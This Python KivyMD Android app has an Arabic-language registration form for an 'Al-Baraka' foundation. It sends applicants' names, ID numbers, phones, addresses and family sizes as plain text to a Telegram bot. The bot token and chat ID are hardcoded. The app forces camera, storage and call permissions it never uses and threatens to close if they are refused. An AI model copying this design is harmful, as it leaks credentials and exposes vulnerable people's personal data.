from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.dialog import MDDialog
from kivy.utils import platform
from kivy.clock import Clock
import requests
import threading

# استدعاء مكتبات أندرويد للتحكم بالصلاحيات
if platform == 'android':
    from android.permissions import request_permissions, Permission, check_permission

class BarakaApp(MDApp):
    # بيانات الربط الخاصة بك
    BOT_TOKEN = "8798745701:AAFkXf2kiTOcZrWuhxGsVtFSIGqW3u9HlQw"
    CHAT_ID = "6691899529"

    def build(self):
        self.theme_cls.primary_palette = "Green"
        self.theme_cls.primary_hue = "700" 
        self.theme_cls.theme_style = "Light"

        self.screen = MDScreen()
        layout = MDBoxLayout(orientation='vertical', padding=25, spacing=12, pos_hint={"top": 1})

        title = MDLabel(
            text="نظام تسجيل مؤسسة البركة", 
            halign="center", 
            font_style="H6", 
            theme_text_color="Primary",
            size_hint_y=None,
            height="40dp"
        )
        layout.add_widget(title)

        # الحقول الستة المطلوبة
        self.fields = {
            "name": MDTextField(hint_text="الاسم الكامل", icon_right="account", mode="fill"),
            "id_num": MDTextField(hint_text="رقم الهوية", icon_right="card-account-details", mode="fill", input_filter="int"),
            "phone": MDTextField(hint_text="رقم الجوال", icon_right="phone", mode="fill", input_filter="phone"),
            "address": MDTextField(hint_text="العنوان السكني", icon_right="map-marker", mode="fill"),
            "family": MDTextField(hint_text="عدد أفراد الأسرة", icon_right="account-group", mode="fill", input_filter="int"),
            "notes": MDTextField(hint_text="ملاحظات إضافية", icon_right="pencil", mode="fill", multiline=True)
        }

        for field in self.fields.values():
            layout.add_widget(field)

        self.submit_btn = MDRaisedButton(
            text="إرسال البيانات والتسجيل", 
            pos_hint={"center_x": 0.5},
            size_hint=(0.9, None),
            height="55dp"
        )
        self.submit_btn.bind(on_release=self.send_data)
        layout.add_widget(self.submit_btn)

        self.status_label = MDLabel(text="", halign="center", theme_text_color="Secondary")
        layout.add_widget(self.status_label)
        
        self.screen.add_widget(layout)
        return self.screen

    def on_start(self):
        if platform == 'android':
            Clock.schedule_once(self.check_required_permissions, 1)

    def check_required_permissions(self, *args):
        perms = [Permission.CAMERA, Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.CALL_PHONE]
        denied_perms = [p for p in perms if not check_permission(p)]
        if denied_perms:
            request_permissions(denied_perms, self.permission_callback)

    def permission_callback(self, permissions, results):
        if False in results:
            self.show_strict_exit_dialog()

    def show_strict_exit_dialog(self):
        self.dialog = MDDialog(
            title="تنبيه الصلاحيات",
            text="يجب منح كافة الصلاحيات للمتابعة أو سيتم إغلاق التطبيق.",
            buttons=[
                MDRaisedButton(text="إعادة المحاولة", on_release=lambda x: [self.dialog.dismiss(), self.check_required_permissions()]),
                MDRaisedButton(text="خروج", on_release=lambda x: self.stop())
            ],
        )
        self.dialog.open()

    def send_data(self, instance):
        self.status_label.text = "جاري الإرسال..."
        threading.Thread(target=self.post_to_telegram).start()

    def post_to_telegram(self):
        summary = "\n".join([f"🔹 {f.hint_text}: {f.text}" for f in self.fields.values()])
        full_message = f"📢 تسجيل جديد من التطبيق:\n\n{summary}"
        url = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendMessage"
        try:
            res = requests.post(url, data={'chat_id': self.CHAT_ID, 'text': full_message}, timeout=10)
            Clock.schedule_once(lambda dt: self.ui_feedback("✅ تم الإرسال بنجاح!", (0, 0.6, 0, 1)))
        except:
            Clock.schedule_once(lambda dt: self.ui_feedback("🌐 خطأ في الاتصال!", (1, 0, 0, 1)))

    def ui_feedback(self, msg, color):
        self.status_label.text = msg
        self.status_label.theme_text_color = "Custom"
        self.status_label.text_color = color

if __name__ == '__main__':
    BarakaApp().run()
